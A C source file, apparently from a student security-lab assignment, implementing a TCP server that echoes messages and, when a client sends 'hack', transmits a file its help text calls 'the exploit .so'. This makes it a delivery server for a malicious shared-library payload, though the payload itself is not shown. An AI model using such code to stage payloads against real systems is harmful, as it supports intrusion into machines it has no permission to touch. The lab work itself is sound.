#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include "support.h"
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#define bufsize 1025;

/*
 * help() - Print a help message.
 */
void help(char *progname) {
    printf("Usage: %s [OPTIONS]\n", progname);
    printf("Start a network server that listens for messages and\n");
    printf("prints them to stdout\n");
    printf("  -p INT the port on which to install the server\n");
    printf("  -f The exploit .so to send\n");
}

/*
 * serve() - Start a server that prints messages as it receives them.
 */
void serve(int port, char * file)
{
	int listenfd = 0;
	int clientfd = 0;
	struct sockaddr_in serv_addr;
        
	listenfd = socket(AF_INET, SOCK_STREAM, 0);
	if (listenfd < 0)
	{
		fprintf(stderr, "Could not create socket\n");
		exit(0);	
	}
	
	printf("Socket retrieve successful\n");
	
	bzero((char *) &serv_addr, sizeof(serv_addr));	
	serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        serv_addr.sin_port = htons(port);

	if (bind(listenfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0)
	{
		fprintf(stderr, "Socket bind error\n");
		exit(0);
	}
	
	if (listen(listenfd, 10) < 0)
	{
		printf("Failed to listen\n");
		exit(0);
	}
	
	while (1)
	{
		char buffer[4105] = "";
		struct sockaddr_in client_addr;
		int addrlen = sizeof(client_addr);
	
		clientfd = accept(listenfd, (struct sockaddr *) &client_addr, &addrlen);
		if (clientfd < 0)
		{
			fprintf(stderr, "Could not accept\n");
			exit(0);
		}

		if( recv(clientfd, buffer, sizeof(buffer), 0) < 0)
		{
		    fprintf(stderr, "Message receive error\n");
		    fprintf(stderr, "ERRNO: %s\n", strerror(errno));
		}
		
		if (strcmp(buffer, "hack"))	
		{
			fprintf(stdout, "%s", buffer);
		}
		else 
		{
			FILE * fp = fopen(file, "rb");
			if (fp == NULL)
			{
				fprintf(stderr, "There was an error opening the file\n");
				exit(0);
			}
			fseek(fp, 0, SEEK_END);
			int file_size = ftell(fp);
			write(clientfd, &file_size, sizeof(file_size));
			fseek(fp, 0, SEEK_SET);
			
			char file_buffer[file_size];
			fread(file_buffer, file_size, 1, fp);
			write(clientfd, &file_buffer, file_size);
			fclose(fp);
		}
		close(clientfd);	
	}
	close(listenfd);
}

/*
 * main() - The main routine parses arguments and invokes hello
 */
int main(int argc, char **argv) {
    /* for getopt */
    long opt;
	int port = -1;
	char * file = NULL;

    /* run a student name check */
    check_team(argv[0]);

    /* parse the command-line options.  For this program, we only support  */
    /* the parameterless 'h' option, for getting help on program usage. */
    while ((opt = getopt(argc, argv, "hp:f:")) != -1) {
        switch(opt) {
          case 'h': help(argv[0]); break;
          case 'p': port = atoi(optarg); break;
		  case 'f': file = optarg;
		}
    }

	if (port < 0 || file == NULL)
	{
		fprintf(stderr, "Invalid arguments\n");
	}

    serve(port, file);

    exit(0);
}
